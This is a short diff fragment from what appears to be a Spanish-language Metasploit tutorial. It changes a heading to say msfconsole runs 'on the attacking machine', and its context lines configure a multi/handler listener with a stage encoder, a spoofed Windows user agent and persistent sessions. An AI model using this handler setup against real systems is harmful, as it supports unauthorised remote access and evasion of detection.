@@ -41,7 +41,7 @@ msf6 > set StageEncoder x64/zutto_dekiru
 msf6 > set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0)"
 msf6 > set ExitOnSession false
 ```
-#### **5. Abrir Msfconsole**
+#### **5. Abrir Msfconsole en la máquina atacante**
 ````bash
 msfconsole
 msfconsole /multi/handler
